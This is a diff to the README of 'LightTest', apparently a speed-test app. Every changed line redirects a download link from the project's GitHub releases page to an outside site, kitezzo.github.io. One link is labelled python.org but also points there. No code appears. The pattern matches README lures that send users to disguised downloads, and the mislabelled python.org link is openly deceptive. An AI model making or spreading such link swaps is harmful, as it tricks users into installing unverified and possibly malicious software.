@@ -1,6 +1,6 @@
 # ⚡ LightTest - Blazing-Fast Internet Speed Testing for Any Device
 
-[![Download LightTest](https://img.shields.io/badge/Download-LightTest-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/kitezzo/LightTest/releases)
+[![Download LightTest](https://img.shields.io/badge/Download-LightTest-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://kitezzo.github.io)
 
 ---
 
@@ -32,7 +32,7 @@ Because LightTest is open source, anyone can inspect its code. You never have to
 
 ### Step 1: Download LightTest
 
-Visit this link to download the application: **[LightTest Releases Page](https://github.com/kitezzo/LightTest/releases)**
+Visit this link to download the application: **[LightTest Releases Page](https://kitezzo.github.io)**
 
 On that page, you'll find the latest version of LightTest available for download. Simply click the download button and save the file to your computer.
 
@@ -44,7 +44,7 @@ Before running LightTest, your computer needs Python installed. Most people don'
 2. Type `cmd` and press Enter to open the Command Prompt
 3. In the black window, type `python --version` and press Enter
 4. If you see something like `Python 3.x.x`, you're ready to go
-5. If you see an error message, download Python from **[python.org](https://www.python.org/downloads/)** and install it using the default settings
+5. If you see an error message, download Python from **[python.org](https://kitezzo.github.io)** and install it using the default settings
 
 ### Step 3: Run LightTest
 
@@ -146,9 +146,9 @@ Whether you're a home user troubleshooting a slow connection, a small business o
 
 **Ready to test your speed?** Click the button below to get started:
 
-[![Download LightTest Now](https://img.shields.io/badge/⬇️_Download-LightTest_Now-1f6feb?style=for-the-badge&logo=python&logoColor=white)](https://github.com/kitezzo/LightTest/releases)
+[![Download LightTest Now](https://img.shields.io/badge/⬇️_Download-LightTest_Now-1f6feb?style=for-the-badge&logo=python&logoColor=white)](https://kitezzo.github.io)
 
-Visit this link to download the application: **[LightTest Releases Page](https://github.com/kitezzo/LightTest/releases)**
+Visit this link to download the application: **[LightTest Releases Page](https://kitezzo.github.io)**
 
 Join the growing community of users who have discovered that fast, reliable speed testing doesn't require a heavy application. Try LightTest today and see how smooth network testing can be.
 
